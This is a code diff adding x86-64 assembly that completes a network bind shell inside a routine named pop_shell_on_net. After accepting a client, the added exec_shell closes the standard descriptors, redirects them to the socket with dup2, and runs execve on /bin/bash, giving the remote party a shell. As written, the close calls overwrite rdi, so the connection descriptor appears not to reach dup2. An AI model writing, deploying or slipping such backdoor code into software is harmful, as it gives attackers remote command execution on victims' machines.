@@ -392,9 +392,58 @@ pop_shell_on_net:
 	je exit_prog; err
 	mov DWORD[rsp + 4], eax
 	; at this point our server is running and has accepted a client
-
+	xor rdi, rdi
+	mov edi, DWORD[rsp + 4]; pass connfd as param
+	call exec_shell
 	add rsp, 12
 	add rsp, 32
+retn
+
+; exec_shell(int connfd)
+exec_shell:
+	xor rax, rax
+	mov rax, 0x0068; "h\0"
+	push rax
+	mov rax, 0x7361622f6e69622f; "/bin/bas"
+	push rax
+	sub rsp, 16; argvs "/bin/bash", NULL
+	lea rbx, [rsp+16]
+	mov QWORD[rsp], rbx; *argvs == "/bin/bash"
+	xor rbx, rbx
+	mov QWORD[rsp + 8], rbx; argvs[1] = NULL
+	sub rsp, 8
+	mov QWORD[rsp], rbx; envp = {NULL}
+	mov rax, 3
+	mov rdi, 0
+	syscall;close(0)
+	mov rax, 3
+	mov rdi, 1
+	syscall;close(1)
+	mov rax, 3
+	mov rdi, 2
+	syscall;close(2)
+	;redirect fds
+	mov rax, 33
+	mov rsi, 0
+	syscall;dup2(connfd, 0);
+	mov rax, 33
+	mov rsi, 1
+	syscall;dup2(connfd, 1);	
+	mov rax, 33
+	mov rsi, 2
+	syscall;dup2(connfd, 2);
+	; time to execve
+	mov rax, 59
+	lea rdi, [rsp + 24]; "/bin/bash"
+	lea rsi, [rsp + 8]
+	lea rdx, [rsp]
+	syscall; execve("/bin/bash", argv, envp);
+	jmp exit_prog
+
+	add rsp, 8
+	add rsp, 16
+	add rsp, 16
+
 retn
 
 ft_strlen:
